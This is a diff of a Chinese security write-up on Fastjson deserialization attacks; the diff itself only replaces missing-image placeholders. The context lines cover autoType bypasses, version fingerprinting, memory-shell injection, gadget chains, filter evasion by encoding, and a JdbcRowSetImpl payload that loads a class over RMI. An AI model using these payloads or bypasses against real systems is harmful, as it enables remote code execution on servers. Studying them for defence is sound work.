 确实是可以写入数据的，但是去找一下谁调用了`putDeserializer` 但似乎是找不到可控的调用点，所以关注点就应该在上述方法中
 
@@ -1339,7 +1339,7 @@ public class Fastjson6 {
 
 首先要思考一下为什么要分成两个部分？因为上面的版本开了`AutoTypeSupport` 是不成功的，而往后的版本是可以成功的，为什么呢？
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-192bc8d40997a15273f17cf47cef7db0d053039d.png) `）
+![](../../.resource/remote/590cb5726cef76c845be88c7adc164acec0f6ee31281bfe0a68881e2bb24381a.png)
 
 这一句话解释的非常清楚，就是说 在第一个键值载入缓存的
 
@@ -1363,7 +1363,7 @@ TypeUtils.getClassFromMapping(typeName) == null
 
 在这个版本当中官方修复了这个缓存的地方，
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-40ae149b1911c0b58c879ec2f9ecd93827adc766.png) `）
+![](../../.resource/remote/5f0054ade01fb8f09a6e3ebb45be03274a3f9514fa044c1fd028be7942a2299a.png)
 
 但是他更新了一个 `safeMode` 如果开启了 safeMode，那么 autoType 就会被完全禁止。不过在这个版本里默认是为 false，后面的版本默认为 true 会直接抛出异常。 接着在下面的 if 中判断是否在期望类的黑名单中，而 AutoCloseable 不在黑名单中，所以给 expectClassFlag 赋值为 true。
 
@@ -1371,7 +1371,7 @@ TypeUtils.getClassFromMapping(typeName) == null
 
 来看一下这个 <span>checkAutoType 函数 </span>
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-cedf0ff5500d94cf5b51e4890aec65f965dbc904.png) `）
+![](../../.resource/remote/68dceda6ad56ca9843469eea054cd46cb033213f234af801df17d26f58d102a8.png)
 
 ### fastjson=1.2.62
 
@@ -1415,11 +1415,11 @@ TypeUtils.getClassFromMapping(typeName) == null
 
 去掉花括号不闭合的话，是会把版本号给露出来的
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-e4bf793113b675680d0ed419674c5df35b766228.png) `）
+![](../../.resource/remote/b729f0cd0e400c0389cb7b7f504ba96971c7a22f82d11eb2510af7d1960757eb.png)
 
 源码中可以看到 当解析器没读到} 时，在报错中就会把版本号一起带出
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-d0b3295e59b49cf70a10c64e337203d6166b3a94.png) `）
+![](../../.resource/remote/a71185012c5aa2c48585bdd732d9b09d5a48b06daae37c0ffa3bc4412a0c1694.png)
 
 以下探测是存在 fastjson 并且可以加载字节码情况
 
@@ -1460,7 +1460,7 @@ TypeUtils.getClassFromMapping(typeName) == null
 
 ```
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-242fc330be13b039e506a6616825423b2eafd3e6.png) `）
+![](../../.resource/remote/0395b2dd5e049f5b10c465ac921ffb06eced440c04f124164de642f1c0e82c57.png)
 
 ‍
 
@@ -1513,7 +1513,7 @@ Fastjson 不出网利用
 
 *   对静态资源写入内容
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-1491b4c57cf878074971a38c79ecf4834af7682f.png) `）
+![](../../.resource/remote/9ea9c190ed665b76a23bb6d9b8195d2a1ad3818ca54fd35aa1a87135a0b6ea58.png)
 
 *   TemplatesImpl 内存马
 
@@ -1640,7 +1640,7 @@ public class TemplatesImplSpringController extends AbstractTranslet {
 
 先是判断了是否存在`$$BCEL$$`
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-527294a871f7d9aa53e9dc21dc74db0ef6f31829.png) `）
+![](../../.resource/remote/8e8c943a211a7c494a53f43078308e281ecc502be32bf068ee4b3cd8a1a562f8.png)
 
 然后进行 `createClass` 进行 BECL 的解码
 
@@ -1648,25 +1648,25 @@ public class TemplatesImplSpringController extends AbstractTranslet {
 
 ‍
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-34e3820778a9c6b23a6874b44a39794f0f3ac9d0.png) `）
+![](../../.resource/remote/7bc7a2c54db76334c84e4be1fb977a1b9e17dcdb23cc284d8a14cae88b272d09.png)
 
 ‍
 
 再看一下 `org.apache.tomcat.dbcp.dbcp2.BasicDataSource#getConnection`方法中，这里调用了 createDataSource 方法
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-b81675a87215cd576ca7412f57e5490dd9542b84.png) `）
+![](../../.resource/remote/8131dc6b1e50ce3aef004b17544bf0fbebd954093eec9c03b6c5f1ab0737b7df.png)
 
 跟进一下`createDataSource()`
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-0e1ffbae61e4df708a4acd761894d301f327e25e.png) `）
+![](../../.resource/remote/ca6b95da547598d64fe2de31e74be542e1cd0b17df113aa29349df907ddfcda6.png)
 
 这里调用了`this.createConnectionFactory()` 再次跟进一下
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-30e807e9a71cd6d2e1af4212f5395fba40aef5d5.png) `）
+![](../../.resource/remote/5f27c3e9d2a27bb76e722a96482c37806a40d6a4513337d4e25c62086a1c8a36.png)
 
 发现是把我们传入的东西作为参数调用了`createDriver`方法执行，再次 跟进
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-a296f3e8d1336adbe1a4a54c81bf86c6af184385.png) `）
+![](../../.resource/remote/41a13d0d661ebccc81816ff986e94c16aa61e62275202d73298ec5957388c41f.png)
 
 可以看到这里是`Class.forName`将类加载进来，并且设置了`initialize`参数为 true【其实就是告诉 Java 虚拟机是否执⾏” 类初始化而 staic 就是在类初始化加载的】而`Class.forName`方法实际上也是调用的`CLassLoader` 来实现的。所以 1 和 3 都是可控的
 
@@ -1678,7 +1678,7 @@ public class TemplatesImplSpringController extends AbstractTranslet {
 
 ‍
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-96027f9ef575ccc6d3bcc3672cdc52cefac0324f.png) `）
+![](../../.resource/remote/72580e6d21f3b24565f004fbc095b6cabffb1571f2d834f798494f4f21aa8e56.png)
 
 `public Connection getConnection()`
 
@@ -1690,7 +1690,7 @@ public class TemplatesImplSpringController extends AbstractTranslet {
 
 但这里就是一个 fastjson 的一个小 trick 了，如果在原先的 json 字符串上再套上一层`{}`，就会吧原先的整体当做一个 key 来认为，来看一下 poc
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-a71894a63ba35e3fb813e9bc6a26076df22cae60.png) `）
+![](../../.resource/remote/7f116c31315adb132df49cd385dccee975e391450d10b2a8b7ab29e02a028652.png)
 
 可以发现 aaa 为 key 后面的为 value，但是再套一层的话，就可以发现整体为 key，value 为 bbb 了，那么这么做的用意是什么呢？
 
@@ -1702,7 +1702,7 @@ public class TemplatesImplSpringController extends AbstractTranslet {
 
 在`DefaultJSONParser.java#parseObject`中找到对 key 进行 toString 方法的调用
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-5ffadeb2e0ea077075561a6ceb1596b8578c54c7.png) `）
+![](../../.resource/remote/47774877f4af7d6d0a9728eb69bfdb8b9d52a005b09569273f5234c86cfc0571.png)
 
 而且 JSONObject 是 Map 的子类，当调用`toString`的时候，会依次调用该类的 getter 方法获取值。然后会以字符串的形式输出出来。所以会调用到`getConnection`方法
 
@@ -2051,7 +2051,7 @@ public class ref_fastjson {
 
 ```
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-386441d01c14545f7b201e5fb6ae0c3edcf510c4.png) `）
+![](../../.resource/remote/56a67448594f6212893b54f233cda596d8bfecb1490b12ed54a80041adaf27f6.png)
 
 这其实不就是一个数组吗，fastjson 解析到`$ref`会判断为是一个引用，`$[0]`表示的是数组里的第一个元素，则`$[0].cmd`表示的是获取第一个元素的 cmd 属性的值。
 
@@ -2059,27 +2059,27 @@ public class ref_fastjson {
 
 进来后并没有处理什么，而是跟进`handleResovleTask` 代码仅仅只是给他赋多了一个属性
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-2c671b118f3a9f70a0619c5ef78ba66750e7007c.png) `）
+![](../../.resource/remote/b4e83bf99c0589109ce685ffeb63664f7dbcca331853811ad2e37943f516dea4.png)
 
 然后会获取`ref`这个 key 的 value，然后吧这两个值作为参数传入`JSONPath.eval`中
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-574c3f4d3096736054e4a6b541ba8a3aaa963296.png) `）
+![](../../.resource/remote/07ac9dcdab018d0ddb13c6efed11369f0a3fe6c5a1a2b73b336388e262aafb85.png)
 
 然后将 value 的值再次 eval
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-2760e35e95e55a55bea83ee30a80d26d5226bb02.png) `）
+![](../../.resource/remote/d184a38a0e8cfc076c683c58363d1e484cc338cb21c0146c6ca1f4e41323366d.png)
 
 这里有一个`init()`
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-cd3114310d221fc568c7fba1fc007e9742f3d7a4.png) `）
+![](../../.resource/remote/60c6963834bca4b25c8993a5bd89a6f76c11e6b05ec300a449a4e37ba45bea05.png)
 
 跟进后发现不满足条件走了下面代码
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-2979f266017123a486232903ae0085d371f44c1d.png) `）
+![](../../.resource/remote/042d11bf79812128125342d5c2d2bf4454a4be2484a9b7ce92288713e3e66934.png)
 
 注意看`explain()`函数，这个函数的作用是把 $ref 的 value 解析成 segment，Segment 是定义在 JSONPath 类的一个 interface，然后 explain() 会把一个完整的 JSONPath 拆分成小的处理逻辑 最终`JSONPath.eval` 最终会调用到`getPropertyValue` 函数，会尝试调用 fieldInfo 的 get 函数或者用反射的方式调用 getter
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-db69bb9915b59e84ef2a07d8ef62a178dccf40f3.png) `）
+![](../../.resource/remote/b277e4bf942a3873de2c7fc45421af9ac108c4da506aa928738290a9653060a9.png)
 
 ‍
 
@@ -2136,9 +2136,9 @@ Fastjson 关键字绕过
 
 当输入的字符是形如`\u`或者`\x`的情况下 fastjson 是会对其进行解码操作的, fastjson 支持字符串的 Unicode 编码和十六进制编码 所以默认情况下是可以通过 unicode 编码和 16 进制来进行绕过的
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-ebcd6f629d81440a7954492ba9cdee2d0f1b67a4.png) `）
+![](../../.resource/remote/4dc9f7e5b602f8df383d0591eea1f68ba0a89bfa7b33e1d0a7a85d10e0c527c3.png)
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-412d7a5ec21a812b1675ad083e83d48bb90da9f8.png) `）
+![](../../.resource/remote/5078a751b3f224a46d9a6e3fd9935490f08662c29159cc10071f8f77b4df28f1.png)
 
 ‍
 
@@ -2164,9 +2164,9 @@ features |= Feature.IgnoreNotMatch.getMask();
 
 ```
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-2760e35e95e55a55bea83ee30a80d26d5226bb02.png) `）
+![](../../.resource/remote/d184a38a0e8cfc076c683c58363d1e484cc338cb21c0146c6ca1f4e41323366d.png)
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-ee67b2a5c2166d755362b53c3d800efa038e4dfc.png) `）
+![](../../.resource/remote/579eb2fc1b6fff22c05696b5fdf0a3cd66ac699fc7c9a3a020dd7e60ea5b5b11.png)
 
 ```
 "@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/Exploit", "autoCommit":true}*/
@@ -2176,13 +2176,13 @@ features |= Feature.IgnoreNotMatch.getMask();
 
 ‍
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-9c79cc6859dbd6835dce502d1242f422dff39c8c.png) `）
+![](../../.resource/remote/efce3e0de90c0df0e2a8d335ef06390f9fb6752673e8ccbebe49ccc91b122a6d.png)
 
 ‍
 
 5.  Content-Type 设置为通配符`*/*`来绕过相关的检查
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-8bb193aa3a58aad369a783c992a3779a59195939.png) `）
+![](../../.resource/remote/c7c1fda8d069f2319faa2a4c41e0e679dd4ea20f0165edda014ea535b8a3c33f.png)
 
 ‍
 
@@ -2335,19 +2335,19 @@ public class Fastjson6 {
 
 1.  使用`-`混淆字段名
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-0e2fac387254ae74f91e12ba38a4b21685ccfab2.png) `）
+![](../../.resource/remote/4780077b2991dbc3fdfd6ecf5a0a5f2288a3aef385104dfc214c8ca41c26d00a.png)
 
 2.  使用`_`混淆字段名
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-491cb71cd58a8ac2449beb604ad02492172f32e7.png) `）
+![](../../.resource/remote/36665f8a48dbf7c3e993b3599aa867a6111dc9e3259aa7fdf27abb2210c8a976.png)
 
 3.  使用`-`和`_`组合
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-24490f11bca60d6bc53bbc92390ebccb7410334f.png) `）
+![](../../.resource/remote/b22e1679f1605d53760b4152c93d50356112aafc09e447a363c081d9f75717d2.png)
 
 4.  添加 is 来混淆属性
 
-**原图暂未找回**（原引用：` ![](https://shs3.b.qianxin.com/attack_forum/2024/03/attach-e2ab299193f77a9be5fff6773e63dd60530fbd6e.png) `）
+![](../../.resource/remote/6fc8e90413a6fff103fda78d911ba763f775bb5f814891743e3acb33f9d2ddea.png)
 
 ‍
 
